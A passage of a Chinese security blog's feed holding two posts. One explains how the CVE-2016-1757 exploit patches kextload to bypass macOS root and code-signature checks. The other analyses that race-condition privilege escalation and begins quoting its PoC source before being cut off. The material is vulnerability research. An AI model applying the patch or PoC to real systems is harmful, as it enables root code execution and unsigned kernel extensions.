class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    byte_100004808 = <span class="number">1</span>;</span><br><span class="line">    v1 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( HIDWORD(v3) )</span><br><span class="line">    mach_port_deallocate(*(_DWORD *)mach_task_self__ptr, HIDWORD(v3));</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到返回0的情况有两种：</p>
<ul>
<li>能够获取到与<code>com.apple.KernelExtensionServer</code>通信的<code>port</code>。</li>
<li>没有获取到<code>port</code>，但是拥有<code>root</code>权限。</li>
</ul>
<p>逻辑比较简单，应该就是为后面的内核扩展加载检测一下权限和资源。<code>patch</code>后直接返回0。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">__int64 __usercall check_root@&lt;rax&gt;(__int64 a1@&lt;rax&gt;)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="2-2_sub_1000023bc">2.2 sub_1000023bc</h2><p>​    该函数相似度有99%，查看<code>patch</code>后的前后对比的具体细节，如下图所示：</p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/patch_kextload/bindiff_check_sign.png" alt="bindiff_check_sign"></p>
<p>通过<code>nop</code>指令，干掉了对<code>sub_100000979</code>函数的调用。直接通过<code>xor</code>指令清零<code>eax</code>。</p>
<p>查看<code>sub_100000979</code>的伪代码，看看该函数究竟做了些什么。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">check_sign</span><span class="params">(__int64 a1, <span class="keyword">char</span> a2, <span class="keyword">char</span> a3)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v3; <span class="comment">// r13@1</span></span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// r15@1</span></span><br><span class="line">  __int64 v5; <span class="comment">// r12@1</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// ebx@1</span></span><br><span class="line">  __int64 v7; <span class="comment">// rax@2</span></span><br><span class="line">  __int64 v8; <span class="comment">// rax@2</span></span><br><span class="line">  __int64 v9; <span class="comment">// r14@2</span></span><br><span class="line">  __int64 v10; <span class="comment">// rax@5</span></span><br><span class="line">  __CFString *v11; <span class="comment">// rdi@5</span></span><br><span class="line">  __int64 v12; <span class="comment">// rsi@10</span></span><br><span class="line">  __int64 v14; <span class="comment">// [sp+8h] [bp-38h]@1</span></span><br><span class="line">  __int64 v15; <span class="comment">// [sp+10h] [bp-30h]@1</span></span><br><span class="line"></span><br><span class="line">  v3 = a3;</span><br><span class="line">  v4 = a2;</span><br><span class="line">  v5 = a1;</span><br><span class="line">  v15 = <span class="number">0L</span>L;</span><br><span class="line">  v14 = <span class="number">0L</span>L;</span><br><span class="line">  v6 = -<span class="number">67061</span>;</span><br><span class="line">  <span class="keyword">if</span> ( a1 )</span><br><span class="line">  &#123;</span><br><span class="line">    LODWORD(v7) = OSKextGetURL();</span><br><span class="line">    LODWORD(v8) = CFURLCopyAbsoluteURL(v7);</span><br><span class="line">    v9 = v8;</span><br><span class="line">    <span class="keyword">if</span> ( v8 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( SecStaticCodeCreateWithPath(v8, <span class="number">0L</span>L, &amp;v15) || !v15 )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_26;</span><br><span class="line">      LODWORD(v10) = OSKextGetIdentifier(a1);</span><br><span class="line">      v11 = &amp;cfstr_AnchorApple;</span><br><span class="line">      <span class="keyword">if</span> ( !(<span class="keyword">unsigned</span> __int8)CFStringHasPrefix(v10, &amp;cfstr_Com_apple_) )</span><br><span class="line">        v11 = &amp;cfstr_AnchorAppleGen;</span><br><span class="line">      <span class="keyword">if</span> ( SecRequirementCreateWithString(v11, <span class="number">0L</span>L, &amp;v14) || !v14 )</span><br><span class="line">      &#123;</span><br><span class="line">LABEL_26:</span><br><span class="line">        OSKextLog(<span class="number">0L</span>L, <span class="number">17L</span>L, <span class="string">"Memory allocation failure."</span>);</span><br><span class="line">        v6 = -<span class="number">67061</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v3 )</span><br><span class="line">          v12 = <span class="number">536870913L</span>L;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          v12 = <span class="number">1073741825L</span>L;</span><br><span class="line">        <span class="comment">//*******************************</span></span><br><span class="line">        <span class="comment">//签名检测</span></span><br><span class="line">        <span class="comment">//*******************************</span></span><br><span class="line">        v6 = SecStaticCodeCheckValidity(v15, v12);</span><br><span class="line">        <span class="keyword">if</span> ( v4 &amp;&amp; v6 &amp;&amp; (<span class="keyword">unsigned</span> __int8)sub_100000B19(v5, v9, <span class="number">1L</span>L) )</span><br><span class="line">          v6 = <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      CFRelease(v9);</span><br><span class="line">      <span class="keyword">if</span> ( v15 )</span><br><span class="line">        CFRelease(v15);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      OSKextLog(<span class="number">0L</span>L, <span class="number">17L</span>L, <span class="string">"Memory allocation failure."</span>);</span><br><span class="line">      v6 = -<span class="number">67061</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v14 )</span><br><span class="line">      CFRelease(v14);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到最核心的就是调用了<code>SecStaticCodeCheckValidity</code>这个函数。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span><br><span class="line">@function SecStaticCodeCheckValidity</span><br><span class="line">	Performs static validation on the given SecStaticCode object. The call obtains and</span><br><span class="line">	verifies the signature on the code object. It checks the validity of all</span><br><span class="line">	sealed components (including resources, if any). It validates the code against</span><br><span class="line">	a SecRequirement if one is given. The call succeeds if all these conditions</span><br><span class="line">	are satisfactory. It fails otherwise.</span><br><span class="line">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*蹩脚的翻译一下</span><br><span class="line">@function SecStaticCodeCheckValidity</span><br><span class="line">	认证传入的SecStaticCode对象的合法性，该函数调用获取并检测数字签名的合法性。</span><br><span class="line">	认证内容包含了所有的组件(如果存在资源文件同样会检测)。</span><br><span class="line">	如果提供了加密的内容，也会对加密部分进行认证。</span><br><span class="line">	当所有条件满足时函数调用返回成功。</span><br><span class="line">*/</span></span><br></pre></td></tr></table></figure>
<p>这是该函数在头文件中的定义。</p>
<h1 id="0x03_小结">0x03 小结</h1><p>​    经过测试确实可以绕过数字签名的检测成功加载了未签名的内核扩展。</p>
<p>​    通过对<code>kextload</code>的<code>patch</code>，绕过两个检测函数，从而达到了绕过<code>OSX</code>系统对驱动扩展的签名检测，结合<a href="http://turingh.github.io/2016/04/03/CVE-2016-1757%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/">CVE-2016-1757</a>的<code>root</code>权限执行任意代码，从而实现了，普通用户可以加载任意未签名的内核扩展。</p>
<h1 id="0x04_勘误">0x04 勘误</h1><p>​    由于不够严谨，遗漏了一个patch的点，这里补上。更详细的原理在<code>exploit</code>的分析文章中可以看到。</p>
<h2 id="4-1_sub_1000023BC">4.1 sub_1000023BC</h2><p>在<code>sub_1000023BC</code>函数中的对sub_085c的调用被patch修改绕过签名验证。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">__text:<span class="number">0000000100002802</span>                 mov     esi, <span class="number">1</span></span><br><span class="line">__text:<span class="number">0000000100002807</span>                 mov     rdi, r15</span><br><span class="line">__text:<span class="number">000000010000280</span>A                 mov     edx, r12d</span><br><span class="line">__text:<span class="number">000000010000280</span>D                 call    sub_10000085C</span><br><span class="line">__text:<span class="number">0000000100002812</span>                 test    eax, eax</span><br><span class="line">__text:<span class="number">0000000100002814</span>                 mov     r12, r14</span><br><span class="line">__text:<span class="number">0000000100002817</span>                 mov     r14, [rbp+var_CD0]</span><br><span class="line">__text:<span class="number">000000010000281</span>E                 jnz     loc_1000028FA</span><br></pre></td></tr></table></figure>
<p>patch后代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">__text:<span class="number">000000010000277</span>E                 mov     r14, r12</span><br><span class="line">__text:<span class="number">0000000100002781</span>                 movzx   r12d, [rbp+var_CB9]</span><br><span class="line">__text:<span class="number">0000000100002789</span>                 mov     esi, <span class="number">1</span></span><br><span class="line">__text:<span class="number">000000010000278</span>E                 mov     rdi, r15</span><br><span class="line">__text:<span class="number">0000000100002791</span>                 mov     edx, r12d</span><br><span class="line">__text:<span class="number">0000000100002794</span>                 nop</span><br><span class="line">__text:<span class="number">0000000100002795</span>                 nop</span><br><span class="line">__text:<span class="number">0000000100002796</span>                 nop</span><br><span class="line">__text:<span class="number">0000000100002797</span>                 xor     eax, eax</span><br><span class="line">__text:<span class="number">0000000100002799</span>                 mov     ebx, eax</span><br><span class="line">__text:<span class="number">000000010000279</span>B                 test    ebx, ebx</span><br></pre></td></tr></table></figure>
<p><code>bindiif</code>如下图所示:</p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/patch_kextload/kanwu1.png" alt="勘误1"></p>
<h1 id="ps:">ps:</h1><p>这是我的学习分享博客<a href="http://turingh.github.io/">http://turingh.github.io/</a></p>
<p>欢迎大家来探讨，不足之处还请指正。</p>
]]></content>
    <summary type="html">
    <![CDATA[<h1 id="0x00_摘要">0x00 摘要</h1><p>​    分析<a href="http://turingh.github.io/2016/04/03/CVE-2016-1757%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/">CVE-2016-1757</a>的EXP过程中，发现EXP通过对kextload程序的patch，绕过了<code>OSX</code>对驱动扩展数字签名的检测，成功加载未签名的驱动扩展。</p>]]>
    
    </summary>
    
      <category term="kernel" scheme="http://turingh.github.io/tags/kernel/"/>
    
      <category term="kextload" scheme="http://turingh.github.io/tags/kextload/"/>
    
      <category term="patch" scheme="http://turingh.github.io/tags/patch/"/>
    
      <category term="OS X" scheme="http://turingh.github.io/categories/OS-X/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[CVE-2016-1757简单分析]]></title>
    <link href="http://turingh.github.io/2016/04/03/CVE-2016-1757%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/"/>
    <id>http://turingh.github.io/2016/04/03/CVE-2016-1757简单分析/</id>
    <published>2016-04-03T17:49:24.000Z</published>
    <updated>2016-04-29T19:07:36.000Z</updated>
    <content type="html"><![CDATA[<h1 id="0x00_摘要">0x00 摘要</h1><blockquote>
<p>灵犀一指可攻可守，进攻时也是一指，是天下第一指法，与移花接玉这个天下第一掌法同样都是非兵刃的第一绝技</p>
<p>—陆小凤传奇</p>
</blockquote>
<p>最近的10.11.4补丁修复了一个利用条件竞争获得代码执行权限的漏洞，经过对内核源码以及poc的理解之后，先对问题作出一个简单的分析。</p>
<a id="more"></a>
<h1 id="0x01_基础知识">0x01 基础知识</h1><h2 id="1-1_exec函数流程">1.1 exec函数流程</h2><p>我在<a href="http://turingh.github.io/2016/03/30/OSX%E5%86%85%E6%A0%B8%E5%8A%A0%E8%BD%BDmach-o%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/">OSX内核加载mach-o流程分析</a>中比较详细的分析了<code>exec</code>整个执行流程中比较重要的几个函数，这个是比较精简的一个流程图。</p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/f10c5443276635863d7ac7aea6fa2e6db76ce2c3/png/OSX%E5%86%85%E6%A0%B8%E5%8A%A0%E8%BD%BDmach-o%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/%E6%95%B4%E4%BD%93%E6%B5%81%E7%A8%8B.png" alt="exec函数图"></p>
<h1 id="1-2_mach_vm_*_API">1.2 mach_vm_* API</h1><p><code>Mach</code>提供了一种用户层对虚拟内存的操作方式。一系列对<code>vm_map_t</code>作出操作的<code>API</code>可以对虚拟内存作出很多操作。这里的<code>vm_map_t</code>就是<code>PORT</code>。</p>
<p>这一系列的API有很多，这里只是简单的介绍一下POC中会使用到的API。</p>
<h3 id="1-2-1_mach_vm_allocate">1.2.1 mach_vm_allocate</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mach_vm_allocate(<span class="keyword">vm_map_t</span> <span class="built_in">map</span>,<span class="keyword">mach_vm_address_t</span> *address,<span class="keyword">mach_vm_size_t</span> size,<span class="keyword">int</span> flags);</span><br></pre></td></tr></table></figure>
<p>在<code>map</code>中分配<code>size</code>个字节大小的内存，根据<code>flags</code>的不同会有不同的处理方式。<code>address</code>是一个<code>I/O</code>的参数（例如：获取分配后的内存大小）。</p>
<p>如果<code>flags</code>的值不是<code>VM_FLAGS_ANYWHERE</code>，那么内存将被分配到<code>address</code>指向的地址。                                                            </p>
<h3 id="1-2-2_mach_vm_region">1.2.2 mach_vm_region</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">kern_return_t</span></span><br><span class="line">mach_vm_region(</span><br><span class="line">	<span class="keyword">vm_map_t</span>		 <span class="built_in">map</span>,</span><br><span class="line">	<span class="keyword">mach_vm_offset_t</span>	*address,		<span class="comment">/* IN/OUT */</span></span><br><span class="line">	<span class="keyword">mach_vm_size_t</span>	*size,			<span class="comment">/* OUT */</span></span><br><span class="line">	<span class="keyword">vm_region_flavor_t</span>	 flavor,		<span class="comment">/* IN */</span></span><br><span class="line">	<span class="keyword">vm_region_info_t</span>	 info,			<span class="comment">/* OUT */</span></span><br><span class="line">	<span class="keyword">mach_msg_type_number_t</span>	*count,			<span class="comment">/* IN/OUT */</span></span><br><span class="line">	<span class="keyword">mach_port_t</span>		*object_name)		<span class="comment">/* OUT */</span></span><br></pre></td></tr></table></figure>
<p>获取<code>map</code>指向的任务内，<code>address</code>地址起始的VM region（虚拟内存区域）的信息。目前标记为<code>flavor</code>只有<code>VM_BASIC_INFO_64</code>。            </p>
<p>获得的info的数据结构如下。                                                </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> vm_region_basic_info_64 &#123;</span><br><span class="line">	<span class="keyword">vm_prot_t</span>		protection;</span><br><span class="line">	<span class="keyword">vm_prot_t</span>		max_protection;</span><br><span class="line">	<span class="keyword">vm_inherit_t</span>		inheritance;</span><br><span class="line">	<span class="keyword">boolean_t</span>		shared;</span><br><span class="line">	<span class="keyword">boolean_t</span>		reserved;</span><br><span class="line">	<span class="keyword">memory_object_offset_t</span>	offset;</span><br><span class="line">	<span class="keyword">vm_behavior_t</span>		behavior;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">short</span>		user_wired_count;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="1-2-3_mach_vm_protect">1.2.3 mach_vm_protect</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">kern_return_t</span></span><br><span class="line">mach_vm_protect(</span><br><span class="line">	<span class="keyword">mach_port_name_t</span> task,</span><br><span class="line">	<span class="keyword">mach_vm_address_t</span> address,</span><br><span class="line">	<span class="keyword">mach_vm_size_t</span> size,</span><br><span class="line">	<span class="keyword">boolean_t</span> set_maximum,</span><br><span class="line">	<span class="keyword">vm_prot_t</span> new_protection)</span><br></pre></td></tr></table></figure>
<p>对<code>address</code>到<code>address+size</code>这一段的内存设置内存保护策略,<code>new_protection</code>就是最后设置成为的保护机制。</p>
<h3 id="1-2-4_mach_vm_write">1.2.4 mach_vm_write</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">kern_return_t</span></span><br><span class="line">mach_vm_write(</span><br><span class="line">	<span class="keyword">vm_map_t</span>			<span class="built_in">map</span>,</span><br><span class="line">	<span class="keyword">mach_vm_address_t</span>		address,</span><br><span class="line">	<span class="keyword">pointer_t</span>			data,</span><br><span class="line">	__unused <span class="keyword">mach_msg_type_number_t</span>	size)</span><br></pre></td></tr></table></figure>
<p>对<code>address</code>指向的内存改写内容。</p>
<h1 id="1-3_Ports">1.3 Ports</h1><p><code>Ports</code>是一种<code>Mach</code>提供的<code>task</code>之间相互交互的机制，通过<code>Ports</code>可以完成类似进程间通信的行为。每个<code>Ports</code>都会有自己的权限。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">define</span> MACH_PORT_RIGHT_SEND		((mach_port_right_t) <span class="number">0</span>)</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> MACH_PORT_RIGHT_RECEIVE		((mach_port_right_t) <span class="number">1</span>)</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> MACH_PORT_RIGHT_SEND_ONCE	((mach_port_right_t) <span class="number">2</span>)</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> MACH_PORT_RIGHT_PORT_SET	((mach_port_right_t) <span class="number">3</span>)</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> MACH_PORT_RIGHT_DEAD_NAME	((mach_port_right_t) <span class="number">4</span>)</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> MACH_PORT_RIGHT_LABELH	        ((mach_port_right_t) <span class="number">5</span>)</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> MACH_PORT_RIGHT_NUMBER		((mach_port_right_t) <span class="number">6</span>)</span></span><br></pre></td></tr></table></figure>
<p><code>Ports</code>可以在不同的<code>task</code>之间传递，通过传递可以赋予其他<code>task</code>对<code>ports</code>的操作权限。例如POC中使用的就是在父进程与子进程之间传递<code>Port</code>得到了对内存操作的权限。</p>
<h1 id="0x02_漏洞原理">0x02 漏洞原理</h1><p>​    在内核处理setuid的程序时存在一个时间窗口，通过这个时间窗口，在进程<code>Port</code>被关闭之前，拥有进程<code>Port</code>的程序可以改写目标进程的任意内存，通过改写内存可以利用目标进程的root权限执行任意的shellcode。</p>
<h2 id="2-1_execv流程漏洞">2.1 execv流程漏洞</h2><p><img src="https://2.bp.blogspot.com/-lw-AyicBVT0/VvGCDuX_AZI/AAAAAAAABRk/sjk9rPkkGhMsrNI6ZkVxNexTffskLBs0Q/s1600/2016-03-22_2.png" alt="流程图"><br><a href="http://turingh.github.io/2016/03/30/OSX%E5%86%85%E6%A0%B8%E5%8A%A0%E8%BD%BDmach-o%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/#1-4_load_machfile">load_machfile源码分析</a></p>
<p><a href="http://turingh.github.io/2016/03/30/OSX%E5%86%85%E6%A0%B8%E5%8A%A0%E8%BD%BDmach-o%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/#1-3_exec_mach_imgact">exec_mach_imgact源码分析</a></p>
<p>在swap_task_map以及exec_handle_suid之间有一个时间窗口，task port还是可以对内存做出修改的。</p>
<p>具体细节可以参考poc，同时也可以参考源码的分析日志。</p>
<h3 id="2-2_捕获时间窗口(灵犀一指)">2.2 捕获时间窗口(灵犀一指)</h3><p>​    时间窗口打开的时机对编写poc非常重要，因为在调用exec之后整个行为都是内核控制的，没有什么直接的办法获取时间窗口，poc中提供的方法是通过不断的调用<code>mach_vm_region</code>，当窗口出现时，也就是从old_map切换到new_map时，<code>mach_vm_region</code>函数获取的address应该是不同的。具体实现在下面的poc源码分析中会提到。</p>
<h3 id="2-3_任意内存写">2.3 任意内存写</h3><p>​    在得到窗口打开的时机之后通过上面提到的port以及mach_vm_*的一系列函数就可以做到对目标进程的任意写操作，从而写入shellcode。</p>
<h3 id="2-4_shellcode的执行(移花接木)">2.4 shellcode的执行(移花接木)</h3><p>​    shellcode要写在什么地方才会被执行呢？    </p>
<p>​    通过对traceroute6的分析，可以看到__text的地址偏移是0x153c，所以通过对该地址的内存改写，可以使得shellcode得到执行。</p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/CVE-2016-1757/shellcode.png" alt="traceroute6"></p>
<h1 id="0x03_POC源码分析">0x03 POC源码分析</h1><h2 id="3-1_main">3.1 main</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">kern_return_t</span> err;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// register a name with launchd</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">mach_port_t</span> bootstrap_port;</span><br><span class="line">  err = task_get_bootstrap_port(mach_task_self(), &amp;bootstrap_port);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (err != KERN_SUCCESS) &#123;</span><br><span class="line">    mach_error(<span class="string">"can't get bootstrap port"</span>, err);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//创建一个具有接受消息权限的port</span></span><br><span class="line">  <span class="keyword">mach_port_t</span> service_port;</span><br><span class="line">  err = mach_port_allocate(mach_task_self(),</span><br><span class="line">                           MACH_PORT_RIGHT_RECEIVE,</span><br><span class="line">                           &amp;service_port);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (err != KERN_SUCCESS) &#123;</span><br><span class="line">    mach_error(<span class="string">"can't allocate service port"</span>, err);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//为port添加SEND权限</span></span><br><span class="line">  err = mach_port_insert_right(mach_task_self(),</span><br><span class="line">                               service_port,</span><br><span class="line">                               service_port,</span><br><span class="line">                               MACH_MSG_TYPE_MAKE_SEND);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (err != KERN_SUCCESS) &#123;</span><br><span class="line">    mach_error(<span class="string">"can't insert make send right"</span>, err);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  <span class="comment">// 注册一个全局的Port</span></span><br><span class="line">  <span class="comment">// 之后的子进程会继承这个port</span></span><br><span class="line">  err = bootstrap_register(bootstrap_port, service_name, service_port);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (err != KERN_SUCCESS) &#123;</span><br><span class="line">    mach_error(<span class="string">"can't register service port"</span>, err);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"[+] registered service \"%s\" with launchd to receive child thread port\n"</span>, service_name);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// fork a child</span></span><br><span class="line">  <span class="keyword">pid_t</span> child_pid = fork();</span><br><span class="line">  <span class="keyword">if</span> (child_pid == <span class="number">0</span>) &#123;</span><br><span class="line">    do_child();</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    do_parent(service_port);</span><br><span class="line">    <span class="keyword">int</span> status;</span><br><span class="line">    wait(&amp;status);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>main函数在建立了port之后之后fork出子程序，开始做各自做的事情。</p>
<h2 id="3-2_do_child">3.2 do_child</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span 